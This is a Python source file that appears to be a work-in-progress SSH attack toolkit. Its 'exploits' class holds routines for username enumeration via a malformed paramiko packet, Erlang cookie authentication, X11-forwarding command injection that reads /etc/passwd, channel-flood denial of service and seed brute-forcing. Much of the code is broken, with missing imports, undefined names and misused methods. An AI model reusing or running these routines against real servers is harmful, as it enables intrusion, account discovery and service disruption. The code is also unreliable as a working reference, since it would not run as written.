#!/bin/env python
import main
from csv import Sniffer
import socket
import connect_listen
from scapy.all import DNS, DNSQR, IP, sr1, UDP, ICMP
from scapy.all import *
from icmplib import ping, multiping, traceroute, resolve
from datetime import datetime
import time
import random
from sys import argv
import xml.etree.ElementTree as ET


# four errors, connect_listen.connect_listen(parameters)
# note to self that I want to find out what ssh libaries the session is using to generate brute_seed, and time if it matches then use the methods below
class exploits:
 def __init__(self):
   super().__init__()
   # self.dirx = dirx

 def _TABLE():
    """ Monkey patch paramiko to send invalid SSH2_MSG_USERAUTH_REQUEST.
        patches the following internal `AuthHandler` functions by updating the internal `_handler_table` dict
            _parse_service_accept
            _parse_userauth_failure
        _handler_table = {
            MSG_SERVICE_REQUEST: _parse_service_request,
            MSG_SERVICE_ACCEPT: _parse_service_accept,
            MSG_USERAUTH_REQUEST: _parse_userauth_request,
            MSG_USERAUTH_SUCCESS: _parse_userauth_success,
            MSG_USERAUTH_FAILURE: _parse_userauth_failure,
            MSG_USERAUTH_BANNER: _parse_userauth_banner,
            MSG_USERAUTH_INFO_REQUEST: _parse_userauth_info_request,
            MSG_USERAUTH_INFO_RESPONSE: _parse_userauth_info_response,
        }
    """

 def get_connect(self, hostname, password, username):
    outer = connect_listen.connect_listen(self.hostname , self.port, self.password , self.username)
    return outer

 def _override(self):
    auth_handler = paramiko.auth_handler.AuthHandler
    old_msg_service_accept = auth_handler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

 def malform_packet(*args, **kwargs):
    old_add_boolean = paramiko.message.Message.add_boolean
    paramiko.message.Message.add_boolean = add_boolean
    result  = old_parse_service_accept(*args, **kwargs)
    #return old add_boolean function so start_client will work again
    paramiko.message.Message.add_boolean = old_add_boolean
    return result

 def send_message(self):
   get_connect(None, None, None).read_data()
   print("... getting message from recv_server")
   self.get_connect(None, None, None).send()


     # create a new scapy packet right here then give the information and send to port 22
 def _debug(self):
   print("sniffing on port 22")
   sniff(filter = 'dst port 22')
	
 def _challenge(self):
   print("... getting the messages from the port 22 on the" + self.server)
   _read_data = get_connect(None, None, None).read_data(1024)
   print(get_connect(None, None, None).get_message(sizeof(read_data)))
   _read_data =struct.unpack(">I", challenge[9:13])[0]
   return _read_data
	 

 def sniff(self):
  proc = subprocess.Popen('ls', stdout=subprocess.PIPE)
  output = proc.stdout.read()
  return output

 def _handlers(self):
  paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
  paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error

 def seed_gen(self, bruteseed, start_time):
	  seed_abuse = (startime + bruteseed)
	  get_connect(None, None, None).send(seed_abuse)
    #return get_connect(None, None, None).read_data(1024).decode("utf-8")

 def Eland_Exploit(self):
   start_time = datetime.now()
   for x in range(100000):
     seed_gen(bruteseed = x / .1000000 , start_time = start_time)

 def xml_overflow(self):
  self.get_connect(None, None, None).invoke_subsytem("netconf")
  xml = "/home/ender/Desktop/interpy/xml_files/_1.xml" #xml document
  get_connect(None, None, None).keep_alive()

  print("...compressing XML document")
  com = lzma.LZMACompressor(format=FORMAT_XZ, check=- 1, preset=None, filters=None)
  self.get_connect(None, None, None).send(content = com.compress(xml))
  print(get_connect(None, None, None).read_data(n).decode("UTF-8"))



 def channel_maker(self):
  for x in range (15000):
     get_connect(None, None, None).new_channel()
     print("sending 65535 bytes")
     self.get_connect(None, None, None).send(bytes(65535))



 # Original Author: Milton Valencia (wetw0rk)
 def erlangcookie(self, stdin):
   name_msg  = b"\x00"
   name_msg += b"\x15"
   name_msg += b"n"
   name_msg += b"\x00\x07"
   name_msg += b"\x00\x03\x49\x9c"
   name_msg += b"AAAAAA@AAAAAAA"
   challenge_reply  = b"\x00\x15"
   challenge_reply += b"r"
   challenge_reply += b"\x01\x02\x03\x04"
   challenge_reply += md5(bytes(argv[1], "ascii") + bytes(str(get_recv_challenge()), "ascii")).digest() # argv is the erlang cookie

   get_connect(None, None, None).send(challenge_reply)


 def ssl_overflow(self):
  c = cert()
  c.cert_gen() # overflow in email address

 def _x11forward(self, cmd = "xxxx\n?\nsource /etc/passwd\n"):
   _local = self.get_connect(None, None, None).get_transport()
   _session = _local.open_x11_session()
   _session.request_x11(cmd)
   _local.accept(0.5)

   #recv output
   #
   if _session.recv_ready():
    return _session.recv(4096)
   if _session.recv_stderr_ready():
    return _session.recv_stderr(4096)

# free pointer is made with do_ssh_kex which can cause ddos attacks
 def _pointer_denial(self, _target, _clientid):
    transport = paramiko.Transport(_target)
    transport.local_version = f"SSH-2.0-{_clientid}"
    transport.connect(username='', password='')

#  credit to @epi052
 def _userenum(self):
  self.malform_packet()
  socket = self.get_connect(input("hostname: "), input("password: "), None).initate()

  transport = self.get_connect(self.hostname, self.passsword, self.username)._transport(socket)
  try:
   transport.start_client()
   transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
  except:
   print("")
# try to overflow xml parser
